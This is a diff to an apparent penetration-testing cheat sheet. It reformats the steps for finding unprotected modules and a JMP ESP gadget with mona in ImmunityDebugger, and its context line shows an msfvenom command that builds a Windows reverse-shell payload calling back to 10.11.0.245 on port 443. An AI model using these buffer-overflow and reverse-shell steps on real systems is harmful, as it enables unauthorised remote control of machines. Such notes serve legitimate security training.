@@ -104,14 +104,12 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.245 LPORT=443 -f c -a x86 --
 ## Local Enumeration & Privilege Escalation
 
 ##### Binary Exploitation with ImmunityDebugger
-```
-# Show loaded modules. 
-# We're interested in modules without protection, Read & Execute permissions
-!mona modules
 
-# Find JMP ESP (FFE4)
-!mona find -s "\xFF\xE4" -m moduleName
-```
+Show loaded modules. We're interested in modules without protection, Read & Execute permissions
+```!mona modules```
+
+Find JMP ESP (FFE4)
+```!mona find -s "\xFF\xE4" -m moduleName```
 
 
 ##### Bash Ping Sweeper
